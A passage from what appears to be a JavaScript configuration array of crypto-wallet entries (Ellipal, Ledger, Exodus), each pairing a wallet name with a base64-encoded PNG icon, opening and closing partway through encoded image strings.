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",
    },
    {
      name: "Ellipal",
      icon: "data:image/png;base64,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",
    },
    {
      name: "Ledger",
      icon: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAPFBMVEUAAAD////u7u6tra13d3f19fUgICDHx8fy8vLAwMDe3t6pqanExMSzs7OwsLCCgoKjo6NdXV3MzMwaGhoCANhXAAABjElEQVR4nO3dS1LCQBSGUQSRJjzV/e/VKi1gJJWbRyc3nLOAv/obkUFIr1YAAAAAAAAAsCRNWXdTTq32T533m4EKy1tX+1b7+877ZaDC9WwL1woVKlT4AoXHVvvH+RQ2h03I+dJq/3KOzR6a0QoPAw32dRitcDPQYF8bhVEKq1MYprA6hWEKq1MYprA6hWEKq1MYprA6hWEKq1MYprA6hWHNtvzaXgca7Ot6O9BQbyoAALy2z6/dn/331EcZyfvtEXn7MfVRRqIwP4X5KcxPYX4K81OYn8L8FOanMD+F+SnMT2F+CvNTmJ/C/BTmpzA/hfkpzE9hfgrzU5ifwvwehVOfZCz3wrfd8V9fn1Mfs4dH4TPvUx+zB4UK50+hwvlbfuH9PzPPpP7FBwCYj+V/n2b53xhSWJ3CMIXVKQxTWJ3CMIXVKQxTWJ3CMIXVKQxTWJ3CMIXVKQx7ocLl3yW7/PuAw9Ld6Ry2/Hu5FSpUqLCtMtvCMlBhU9bdlFOr/VPnfTfpAAAAAAAAALAsP+p2HcnaTMOKAAAAAElFTkSuQmCC",
    },
    {
      name: "Exodus",
      icon: "data:image/png;base64,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